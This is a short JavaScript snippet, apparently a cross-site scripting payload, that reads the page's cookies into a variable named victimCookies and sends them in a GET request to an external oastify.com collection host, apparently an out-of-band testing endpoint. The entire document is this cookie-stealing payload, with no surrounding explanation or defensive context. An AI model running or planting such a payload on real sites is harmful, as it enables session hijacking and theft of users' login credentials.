var victimCookies=document.cookie
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://rkfxajknro2l1l7f5k3ib13wwn2eq6ev.oastify.com?cookies=" + victimCookies, true);

xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    var response = xhr.responseText;
    console.log(response);
    // Process the response data here
  } else if (xhr.readyState === 4) {
    console.log('Request failed with status code:', xhr.status);
    // Handle any errors that occur during the request
  }
};

xhr.send();
